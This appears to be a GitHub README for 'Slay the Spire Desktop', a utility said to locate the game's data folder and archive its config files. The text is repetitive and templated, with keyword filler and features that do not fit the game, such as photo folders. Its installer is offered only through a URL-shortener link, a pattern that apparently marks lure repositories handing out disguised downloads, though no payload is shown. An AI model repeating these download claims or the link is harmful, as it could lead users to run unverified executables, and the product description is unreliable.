![Slay the Spire Desktop](assets/hero.png)

# Slay the Spire Desktop

*Find the Slay the Spire folder fast and keep a local spare.*

## What Slay the Spire Desktop is

This repository is **Slay the Spire Desktop**, a Windows utility. Find the Slay the Spire folder fast and keep a local spare.

Slay the Spire drops data files next to launcher caches.

It runs on the local PC. No account, and nothing is uploaded.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Finds the Slay the Spire data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Why it exists

People search Slay the Spire desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/m-watson7288/slay-the-spire-desktop

MIT license. See `LICENSE`.
